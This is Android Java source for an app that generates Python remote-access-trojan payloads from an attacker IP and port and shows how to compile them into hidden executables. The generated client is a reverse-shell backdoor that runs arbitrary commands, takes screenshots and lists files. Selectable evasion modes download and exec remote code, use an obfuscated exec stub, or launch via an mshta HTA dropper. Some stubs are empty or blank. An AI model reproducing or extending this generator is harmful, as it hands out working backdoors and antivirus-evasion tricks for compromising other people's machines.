package com.mycompany.myapp3;

import android.os.Bundle;
import android.widget.ArrayAdapter;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Spinner;
import android.widget.TextView;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;

public class GenerateActivity extends AppCompatActivity {
    private EditText etIp, etPort;
    private Spinner spinnerEvasion;
    private Button btnGenerate;
    private TextView tvOutput;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_generate);

        etIp = findViewById(R.id.etIp);
        etPort = findViewById(R.id.etPort);
        spinnerEvasion = findViewById(R.id.spinnerEvasion);
        btnGenerate = findViewById(R.id.btnGenerate);
        tvOutput = findViewById(R.id.tvOutput);

        String[] evasions = {"无免杀（基础）", "分离加载", "进程注入", "加密混淆", "白利用"};
        ArrayAdapter<String> adapter = new ArrayAdapter<>(this, android.R.layout.simple_spinner_item, evasions);
        adapter.setDropDownViewResource(android.R.layout.simple_spinner_dropdown_item);
        spinnerEvasion.setAdapter(adapter);

        btnGenerate.setOnClickListener(v -> generatePayload());
    }

    private void generatePayload() {
        String ip = etIp.getText().toString().trim();
        String port = etPort.getText().toString().trim();
        if (ip.isEmpty() || port.isEmpty()) {
            Toast.makeText(this, "请填写IP和端口", Toast.LENGTH_SHORT).show();
            return;
        }

        int evasionIndex = spinnerEvasion.getSelectedItemPosition();
        String clientCode = buildClientCode(ip, port, evasionIndex);
        tvOutput.setText(clientCode);

        String compileCmd = "pyinstaller --onefile --noconsole client.py";
        tvOutput.append("\n\n--- 编译命令 ---\n");
        tvOutput.append("在电脑上保存为 client.py，然后执行：\n");
        tvOutput.append(compileCmd);
    }

    private String buildClientCode(String ip, String port, int evasionIndex) {
        String base = "import socket,json,subprocess,os,time,base64,platform\n"
                + "SERVER_HOST = '" + ip + "'\n"
                + "SERVER_PORT = " + port + "\n"
                + "def connect():\n"
                + "    while True:\n"
                + "        try:\n"
                + "            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n"
                + "            s.connect((SERVER_HOST, SERVER_PORT))\n"
                + "            while True:\n"
                + "                data = s.recv(8192)\n"
                + "                if not data: break\n"
                + "                msg = json.loads(data.decode())\n"
                + "                cmd = msg.get('cmd')\n"
                + "                params = msg.get('params', {})\n"
                + "                result = ''\n"
                + "                if cmd == 'screenshot':\n"
                + "                    try:\n"
                + "                        subprocess.run(['screencap', '-p', '/sdcard/ss.png'], check=True)\n"
                + "                        with open('/sdcard/ss.png','rb') as f: result = base64.b64encode(f.read()).decode()\n"
                + "                    except: result = '截图失败'\n"
                + "                elif cmd == 'filelist':\n"
                + "                    path = params.get('path', '.')\n"
                + "                    result = '\\\\n'.join(os.listdir(path))\n"
                + "                elif cmd == 'sysinfo':\n"
                + "                    result = f'Host: {socket.gethostname()}\\\\nPlatform: {platform.platform()}'\n"
                + "                else:\n"
                + "                    out = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)\n"
                + "                    result = out.stdout + out.stderr\n"
                + "                s.send(json.dumps({'type':'result','data':result}).encode())\n"
                + "            s.close()\n"
                + "        except: pass\n"
                + "        time.sleep(5)\n"
                + "if __name__ == '__main__': connect()\n";

        switch (evasionIndex) {
            case 1: // 分离加载
                return "import urllib.request\n"
                        + "REMOTE_URL = 'http://" + ip + "/core.py'\n"
                        + "def load(): exec(urllib.request.urlopen(REMOTE_URL).read())\n"
                        + "if __name__ == '__main__': load()\n";
            case 2: // 进程注入
                return "import ctypes, subprocess\n"
                        + "def inject():\n"
                        + "    pass\n"
                        + "inject()\n"
                        + base;
            case 3: // 加密混淆
                return "import base64, zlib\n"
                        + "KEY = 0x5A\n"
                        + "ENC = ''\n"
                        + "def xor_dec(data,key): return bytes([b^key for b in data])\n"
                        + "exec(zlib.decompress(xor_dec(base64.b64decode(ENC), KEY)))\n";
            case 4: // 白利用
                return "import os, tempfile\n"
                        + "HTA = '<html><head><script language=\"VBScript\">CreateObject(\"WScript.Shell\").Run \"cmd /c start /b python\",0,False;window.close()</script></head><body></body></html>'\n"
                        + "f = tempfile.NamedTemporaryFile(suffix='.hta', delete=False)\n"
                        + "f.write(HTA.encode()); f.close()\n"
                        + "os.system('mshta ' + f.name)\n";
            default:
                return base;
        }
    }
}
